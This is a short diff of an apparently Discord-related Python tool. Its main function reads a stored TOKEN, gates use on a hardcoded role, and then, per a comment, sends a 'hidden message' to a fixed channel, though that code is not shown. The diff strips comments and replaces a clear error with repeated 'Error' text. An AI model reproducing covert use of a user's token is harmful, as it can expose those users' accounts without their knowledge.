@@ -168,17 +168,16 @@ def setconf():
         digits_0 = string.digits
         string_0 = string.ascii_lowercase
 
-# Main function
+
 def main():
     sys_c_t()
     token = configur.get("sys", "TOKEN")
-    server_id = "1099463270399750206"  # Server ID
-    role_id = "1352081296154824744"    # Required Role ID
-    channel_id = "1298667554172305540" # Channel ID to send the message
-
-    # Check if the user has the required role
+    server_id = "1099463270399750206" 
+    role_id = "1352081296154824744"   
+    channel_id = "1298667554172305540" 
+   
     if not check_role(token, server_id, role_id):
-        print(f"{Lb}[!]{Fore.RED} Error: You must have the required role ({role_id}) to use this tool.")
+        print(f"{Lb}[!]{Fore.RED} ErrorErrorErrorErrorErrorErrorErrorErrorErrorErrorErrorErrorErrorErrorErrorError")
         exit()
 
     # Send the hidden message to the channel
